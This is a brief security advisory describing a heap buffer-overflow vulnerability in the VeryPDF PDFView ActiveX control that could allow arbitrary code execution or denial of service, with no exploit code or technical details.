The VeryPDF PDFView ActiveX control is prone to a heap buffer-overflow vulnerability because it fails to properly bounds-check user-supplied data before copying it into an insufficiently sized memory buffer.

An attacker can exploit this issue to execute arbitrary code within the context of the affected application. Failed exploit attempts will result in denial-of-service conditions.
